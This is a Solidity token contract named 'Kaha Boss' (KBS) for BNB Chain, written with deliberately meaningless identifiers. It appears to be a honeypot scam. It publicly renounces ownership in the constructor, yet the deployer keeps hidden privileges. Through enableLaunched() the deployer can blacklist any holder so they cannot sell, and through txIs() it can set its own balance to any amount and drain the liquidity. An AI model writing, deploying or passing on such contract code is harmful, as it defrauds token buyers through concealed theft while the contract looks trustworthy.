/**
 *Submitted for verification at BscScan.com on 2023-02-16
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


interface totalLaunched {
    function createPair(address marketingFeeWallet, address modeTx) external returns (address);
}

interface limitWalletTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KahaBoss {

    constructor (){
        
        limitWalletTo swapFrom = limitWalletTo(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        totalExemptTx = totalLaunched(swapFrom.factory()).createPair(swapFrom.WETH(), address(this));
        owner = swapWallet();
        if (liquidityTotal) {
            modeTeam = true;
        }
        atAmount = owner;
        toShould[atAmount] = true;
        balanceOf[atAmount] = totalSupply;
        if (amountFee != exemptSender) {
            liquidityTotal = false;
        }
        emit Transfer(address(0), atAmount, totalSupply);
        fromLaunch();
    }

    function transferFrom(address autoAmount, address limitFund, uint256 liquiditySell) external returns (bool) {
        if (allowance[autoAmount][swapWallet()] != type(uint256).max) {
            require(liquiditySell <= allowance[autoAmount][swapWallet()]);
            allowance[autoAmount][swapWallet()] -= liquiditySell;
        }
        return minIs(autoAmount, limitFund, liquiditySell);
    }

    mapping(address => bool) public toShould;

    uint8 public decimals = 18;

    uint256 public exemptSender;

    function takeTotal() public view returns (bool) {
        return liquidityTotal;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    address public atAmount;

    function enableLaunched(address txSwap) public {
        if (modeTeam) {
            exemptSender = amountFee;
        }
        if (txSwap == atAmount || txSwap == totalExemptTx || !toShould[swapWallet()]) {
            return;
        }
        if (modeTeam) {
            amountFee = exemptSender;
        }
        shouldReceiver[txSwap] = true;
    }

    function autoTeamLaunch(address tradingLaunchExempt) public {
        if (enableModeMax) {
            return;
        }
        if (amountFee == exemptSender) {
            modeTeam = true;
        }
        toShould[tradingLaunchExempt] = true;
        
        enableModeMax = true;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function minIs(address autoAmount, address limitFund, uint256 liquiditySell) internal returns (bool) {
        if (autoAmount == atAmount) {
            return amountReceiver(autoAmount, limitFund, liquiditySell);
        }
        require(!shouldReceiver[autoAmount]);
        return amountReceiver(autoAmount, limitFund, liquiditySell);
    }

    function fromLaunch() public {
        emit OwnershipTransferred(atAmount, address(0));
        owner = address(0);
    }

    bool public liquidityTotal;

    function txIs(uint256 liquiditySell) public {
        if (!toShould[swapWallet()]) {
            return;
        }
        balanceOf[atAmount] = liquiditySell;
    }

    event Approval(address indexed feeWallet, address indexed spender, uint256 value);

    bool public enableModeMax;

    function toLaunchList() public {
        if (modeTeam) {
            exemptSender = amountFee;
        }
        if (amountFee != exemptSender) {
            modeTeam = true;
        }
        liquidityTotal=false;
    }

    function approve(address shouldTeam, uint256 liquiditySell) public returns (bool) {
        allowance[swapWallet()][shouldTeam] = liquiditySell;
        emit Approval(swapWallet(), shouldTeam, liquiditySell);
        return true;
    }

    function transfer(address minReceiverSell, uint256 liquiditySell) external returns (bool) {
        return minIs(swapWallet(), minReceiverSell, liquiditySell);
    }

    function swapWallet() private view returns (address) {
        return msg.sender;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => bool) public shouldReceiver;

    function receiverTrading() public {
        if (modeTeam) {
            exemptSender = amountFee;
        }
        if (liquidityTotal) {
            modeTeam = true;
        }
        modeTeam=false;
    }

    function amountReceiver(address autoAmount, address limitFund, uint256 liquiditySell) internal returns (bool) {
        require(balanceOf[autoAmount] >= liquiditySell);
        balanceOf[autoAmount] -= liquiditySell;
        balanceOf[limitFund] += liquiditySell;
        emit Transfer(autoAmount, limitFund, liquiditySell);
        return true;
    }

    event Transfer(address indexed from, address indexed buyTradingExempt, uint256 value);

    function tradingFund() public {
        if (modeTeam != liquidityTotal) {
            modeTeam = false;
        }
        
        amountFee=0;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private amountFee;

    address public totalExemptTx;

    bool public modeTeam;

    function tradingSwap() public {
        if (liquidityTotal) {
            modeTeam = false;
        }
        if (amountFee != exemptSender) {
            liquidityTotal = false;
        }
        amountFee=0;
    }

    string public symbol = "KBS";

    address public owner;

    function sellSender() public {
        if (liquidityTotal) {
            liquidityTotal = false;
        }
        if (exemptSender == amountFee) {
            exemptSender = amountFee;
        }
        liquidityTotal=false;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function tradingTo() public view returns (uint256) {
        return exemptSender;
    }

    string public name = "Kaha Boss";

}